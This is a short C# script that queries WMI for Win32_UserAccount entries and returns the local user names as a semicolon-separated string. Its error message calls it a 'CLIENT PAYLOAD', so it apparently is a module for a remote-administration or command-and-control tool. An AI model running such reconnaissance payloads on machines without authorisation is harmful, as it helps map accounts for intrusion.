//assembly System;
//assembly System.IO;
//assembly System.Linq;
//assembly System.Text.RegularExpressions;
//assembly System.Management;

#r "System.Management.dll" //$INTELLISENSE

using System;
using System.IO;
using System.Linq;
using System.Management;

try {  
    string users = "";
    SelectQuery query = new SelectQuery("Win32_UserAccount");
    ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
    foreach (ManagementObject envVar in searcher.Get()) {
         users += envVar["Name"] + ";";
    }
    return users;
} catch (Exception e) {
    return "{#} CLIENT PAYLOAD FAILED! {#} " + e.Message;
}